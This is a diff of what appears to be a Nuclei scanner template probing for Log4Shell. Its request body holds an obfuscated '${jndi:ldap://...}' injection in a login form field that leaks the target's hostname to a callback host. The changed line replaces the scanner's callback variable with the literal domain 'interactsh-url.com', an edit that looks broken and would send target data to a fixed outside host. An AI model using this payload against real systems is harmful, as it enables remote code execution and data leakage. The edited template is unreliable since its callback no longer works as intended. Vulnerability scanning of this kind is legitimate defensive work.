@@ -31,7 +31,7 @@ http:
         Referer: {{RootURL}}
         Content-Type: application/x-www-form-urlencoded
 
-        domain={{str}}.com&UserID=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&EnteredUserID=a&Password=a
+        domain={{str}}.com&UserID=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}&EnteredUserID=a&Password=a
 
     matchers-condition: and
     matchers:
